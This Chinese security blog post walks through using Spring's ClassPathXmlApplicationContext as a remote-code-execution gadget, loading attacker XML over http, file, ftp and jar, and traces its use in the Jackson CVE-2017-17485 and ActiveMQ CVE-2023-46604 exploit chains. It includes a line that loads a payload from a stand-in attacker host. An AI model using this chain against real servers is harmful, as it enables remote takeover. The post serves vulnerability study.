> **原文链接**: https://mp.weixin.qq.com/s?__biz=Mzk3NTE3MjU4Mg==&mid=2247484302&idx=1&sn=42e0113f5e72ddc92f84826671500353

#  【JAVA安全笔记】ClassPathXmlApplicationContext利用链 有参构造对象RCE打法  
原创 Shelter1234  安全研究员   2025-07-21 14:00  
  
  ClassPathXmlApplicationContext 是 Spring 框架中的一个重要类，用于加载应用程序的上下文配置。它从类路径中读取 XML 配置文件，并根据该配置文件创建和管理 Spring 的 bean。它的构造函数接收一个 String 类型的路径参数，支持持 http://、file://、ftp://、classpath: 等多种协议。  
  
new ClassPathXmlApplicationContext("http://attacker.com/poc.xml");  
  
该类在初始化过程中会加载传入的 XML 文件，并解析其中的 <bean> 定义，进而触发类加载、静态代码块执行等行为，常用于构造远程代码执行（RCE）利用链。  
  
  
简单示例  
  
假设我们有如下类  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/6mJWHPYFey2EhdRRD3y8U6IAaibmUvHUTIy10v0xibztxHnWGiby3MC4NhB1Gf6nhKbV7d5JFPZRjW4xPibib6p7fzQ/640?wx_fmt=png&from=appmsg "")  
  
编写applicationContext.xml xml文件  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/6mJWHPYFey2EhdRRD3y8U6IAaibmUvHUTQVnYospjHnqm77uib2QXmOdbkydAoUF7fyoRzolXFGYao7n98sZMMmw/640?wx_fmt=png&from=appmsg "")  
  
使用ClassPathXmlApplicationContext进行加载  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/6mJWHPYFey2EhdRRD3y8U6IAaibmUvHUTcADsmEfp5wT7E0eakWCpribcBIiaFlPHicNs0EkicjEl9S4kC5z8Cm2NvQ/640?wx_fmt=png&from=appmsg "")  
  
输出：得到这个bean对象 调用doSomething  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/6mJWHPYFey2EhdRRD3y8U6IAaibmUvHUTibnV34b8iaV6j5r6c8PTGo8aj4syJsKZibMGzNMPaUu0BGbKyc5YFLDyA/640?wx_fmt=png&from=appmsg "")  
  
假设applicationContext.xml 有如下的bean 我们则可以执行系统命令  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/6mJWHPYFey2EhdRRD3y8U6IAaibmUvHUTibVhdUQnYicZhsWmu8Ijoib7kWk1TICoUOXqXwzpNQFZicHAtQl544uh8g/640?wx_fmt=png&from=appmsg "")  
  
只需创建context对象便可触发  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/6mJWHPYFey2EhdRRD3y8U6IAaibmUvHUT7YDicZ4tS5ugyeHkhib3phqRFSKfrZI7GkXAYghHnMUiadVict0aHb2Cyw/640?wx_fmt=png&from=appmsg "")  
  
ClassPathXmlApplicationContext 可支持的协议测试  
  
1.http协议  
  
使用python -m http.server -b 0.0.0.0 创建一个http服务，提供以下文件  
  
（注意：加载的xml格式的文件与文件后缀无关）  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/6mJWHPYFey2EhdRRD3y8U6IAaibmUvHUTFajic4hYvIksSz4WQrFmSQic3HuozY02GglqRMerrrFbxvBtzYFQpDXg/640?wx_fmt=png&from=appmsg "")  
  
ClassPathXmlApplicationContext加载，改xml格式的txt文件  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/6mJWHPYFey2EhdRRD3y8U6IAaibmUvHUTRLfDTEXypfeGFUHicO8eozBUMCpPEp62wJ6udEnf1raxAibyu0cVovuw/640?wx_fmt=png&from=appmsg "")  
  
执行结果  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/6mJWHPYFey2EhdRRD3y8U6IAaibmUvHUTaSedpTs19gO2FBqhiakP0KxARl28nzLXORzEmP9icIuYwoSPFiaXv8ibwg/640?wx_fmt=png&from=appmsg "")  
  
2.file协议  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/6mJWHPYFey2EhdRRD3y8U6IAaibmUvHUTETmHY804oZ8SJsm4Zwf8ZgP0ddtq9q6KzPMfx50iaicQxUmlAicFr7wOQ/640?wx_fmt=png&from=appmsg "")  
  
执行结果  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/6mJWHPYFey2EhdRRD3y8U6IAaibmUvHUTfwP0j9VUeT0ibuEgyyxsfIxErZT81HYUdTciaowWS9iagn4bJNHSwaGPw/640?wx_fmt=png&from=appmsg "")  
  
3.ftp协议  
  
本地起一个匿名服务器  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/6mJWHPYFey2EhdRRD3y8U6IAaibmUvHUT2tUoxD1lHHPW1eEVB1EiboQ3ufEP9MoNqo4aMsukiaqoaO47lPicCDAxA/640?wx_fmt=png&from=appmsg "")  
  
运行结果  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/6mJWHPYFey2EhdRRD3y8U6IAaibmUvHUTZfCNLoys7ZWCm9u5HTvgLCXianDbOG4LpBWznz7avxIlgIXEicpbAXNA/640?wx_fmt=png&from=appmsg "")  
  
4.jar协议  
  
jar cvf payload.jar poc.txt 生成jar包  
  
测试结果  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/6mJWHPYFey2EhdRRD3y8U6IAaibmUvHUTr3rvOIibpNwuibOtuPpUcbEzhdXAianbe6x0YpmjajW1AyLK4Ldia7ptrg/640?wx_fmt=png&from=appmsg "")  
  
  
实战中的应用  
  
1. CVE-2017-17485  
  
Jackson反序列化漏洞利用链  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/6mJWHPYFey2EhdRRD3y8U6IAaibmUvHUTSBV5UzIvicIXYw1yfjXFvT0e9xygVTehxYQ78SwIrLNLpddhSPpVukA/640?wx_fmt=png&from=appmsg "")  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/6mJWHPYFey2EhdRRD3y8U6IAaibmUvHUTQYcMd7mCh4rg8oxVXk6RQm0yqa9waZoNiboUiaqhrZtPqewYIO0W5lZg/640?wx_fmt=png&from=appmsg "")  
  
（关于jsckson的序列化利用姿势后面再讲解）  
  
2. Apache ActiveMQ OpenWire 协议反序列化命令执行漏洞 CVE-2023-46604  
  
BaseDataStreamMarshaller 中的createThrowable方法，将会对参数进行构造方法调用，实例化一个都对象。  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/6mJWHPYFey2EhdRRD3y8U6IAaibmUvHUTQG73ic78YeiaIX07BZWfdn0qThcoHp26raloLRKQvK8qsASCG4q8icAyw/640?wx_fmt=png&from=appmsg "")  
  
若参数可控，可以考虑ClassPathXmlApplicationContext的打法利用链  
  
右键find useages - createThrowable  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/6mJWHPYFey2EhdRRD3y8U6IAaibmUvHUTxx7Nvibjuv7V0Le3M4icDOF2h9EzQYmdZKsgBkZeUf5ENkQvuM3WnOSQ/640?wx_fmt=png&from=appmsg "")  
  
跟进其中一个looseUnmarsalThrowable进行分析  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/6mJWHPYFey2EhdRRD3y8U6IAaibmUvHUTRCG1MVjMejOKChQZyzmicdhcdWTbTR72NFKA1Bumj94jEGSOIQDuJxQ/640?wx_fmt=png&from=appmsg "")  
  
clazz 与 message 均来自dataIn，貌似是一个输入流  
  
继续分析looseUnmarsalThrowable的调用  
  
右键find useages - looseUnmarsalThrowable  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/6mJWHPYFey2EhdRRD3y8U6IAaibmUvHUTxF9J9gwicEic1wIj29RQxvFAjoPhicOzRF3IOnPF0aw0dhRoFxgjGVvZw/640?wx_fmt=png&from=appmsg "")  
  
跟进其中一个ExceptionResponseMarshaller进行分析  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/6mJWHPYFey2EhdRRD3y8U6IAaibmUvHUTPpSmJuqVHdywG8k3FYHX7MbQia2lv7yibAibsX2yx12elJnm4463mpIHQ/640?wx_fmt=png&from=appmsg "")  
  
继续向上分析looseUnmarshal 的调用  
  
最终找到一个doUnmarshal的方法  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/6mJWHPYFey2EhdRRD3y8U6IAaibmUvHUTzYyiaZTYB36N1BSfIhQaPoVoDOaqzib5SPnibQmibPT9WohFicFwiby5iaj6Q/640?wx_fmt=png&from=appmsg "")  
  
这里我们需要做如下考虑  
  
1，我们需要dsm等于ExceptionResponseMarshaller ，这样就会调用ExceptionResponseMarshaller 的looseUnmarshal 方法。如此要dataType为31  
  
2，this.tightEncodingEnabled 成立  
  
继续分析doUnmarshal的调用  
  
右键find useages - doUnmarshal  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/6mJWHPYFey2EhdRRD3y8U6IAaibmUvHUTFOZ8ONhShyGhgZEoMRtYwgykV7qn9hzpPNHEKbbxQ8X1X2200ZrONw/640?wx_fmt=png&from=appmsg "")  
  
来到unmarshal 方法  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/6mJWHPYFey2EhdRRD3y8U6IAaibmUvHUTibwCFibf7PPvVDj8EoAbElhYdQwbsUqM6OeOuH6icRunhDwq7tv8n49Fw/640?wx_fmt=png&from=appmsg "")  
  
继续向上  
  
右键find useages - unmarshal  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/6mJWHPYFey2EhdRRD3y8U6IAaibmUvHUTibPomFjdtq8pZxicicHJ7IlXe2GOUsoBYZjfqJRSm418H0kEmWMibD2TXQ/640?wx_fmt=png&from=appmsg "")  
  
来到readCommand()  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/6mJWHPYFey2EhdRRD3y8U6IAaibmUvHUTxic4ibicsshibz8a3sozb5LlGpBMUzhibvvD6KmVngwgxSylZXOkRe0WtFw/640?wx_fmt=png&from=appmsg "")  
  
readCommand()<—doRun()<—run()  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/6mJWHPYFey2EhdRRD3y8U6IAaibmUvHUTEiaib7OX228spUnb3EnL4h7ZZBeeY0xF62ia05JibRwp1HhC7a5ZlbGctA/640?wx_fmt=png&from=appmsg "")  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/6mJWHPYFey2EhdRRD3y8U6IAaibmUvHUTqcpRdApNjmS1HVdWBTLDyJJsMykTIyWp1kYtsvOJbRhItTeSZorKAw/640?wx_fmt=png&from=appmsg "")  
  
至此调用链分析就结束了  
  
要想成功加载恶意类，控制dataIn中的数据即可，  
  
如何制造我们想要的序列化数据呢？  
  
既然有readCommand，那么就会有writeCommand  
  
参考下同类下的oneway方法  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/6mJWHPYFey2EhdRRD3y8U6IAaibmUvHUTB3S1KunOiaBf4TDJY7tOqpJ0131Ax7fh9YZyKMTgIEiaMDLmWiakEH8Bw/640?wx_fmt=png&from=appmsg "")  
  
有兴趣的话可以分析producer.send(message);是如何到达oneway方法的  
  
（在 Apache ActiveMQ 中，当调用 producer.send(message) 发送消息时，消息的发送过程经过了几个步骤，最终会触发 oneway 方法。）  
  
我们可以直接获取oneway方法，并且传入exceptionResponse  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/6mJWHPYFey2EhdRRD3y8U6IAaibmUvHUTGS2xibL459yhtymfZrnS4HSW8CA66F0zB8BQDEXZqiaicuOeTh0PGoBAw/640?wx_fmt=png&from=appmsg "")  
  
构造一个ClassPathXmlApplicationContext 它需要与ExceptionResponse 产生关联，于是便可以这样写  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/6mJWHPYFey2EhdRRD3y8U6IAaibmUvHUTlLnJ6yC23nakUtPciarFbWYSJOT1fsrNUpnQPQJpO7rVcViaGIO74RUg/640?wx_fmt=png&from=appmsg "")  
  
之后用ExceptionResponse封装这个类  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/6mJWHPYFey2EhdRRD3y8U6IAaibmUvHUTrOwyDGRFQn0jE6667icu0lN4ib3fqD6v3b0nNd6KBnLoHsric9eEL2ssg/640?wx_fmt=png&from=appmsg "")  
  
有如下生成恶意的流数据，让服务端读取数据时触发异常，创建ClassPathXmlApplicationContext 对象执行代码  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/6mJWHPYFey2EhdRRD3y8U6IAaibmUvHUTq7icdWdY20FXV6PCQlMRD0AOECtPYGibHXN0pdAWLxyyLuE467adEicIw/640?wx_fmt=png&from=appmsg "")  
  
或者使用其他形式生成流数据  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/6mJWHPYFey2EhdRRD3y8U6IAaibmUvHUTMZ4iaGbAY94eiczKgRFdISD2ADfnJ88LhZlQfd9LSwYD7jvVxPia83wfA/640?wx_fmt=png&from=appmsg "")  
  
参考  
  
https://blog.csdn.net/shelter1234567/article/details/137041683?spm=1011.2415.3001.5331 (自家博客)  
  
https://github.com/vulhub/vulhub/blob/master/activemq/CVE-2023-46604/README.zh-cn.md  
  
  
  
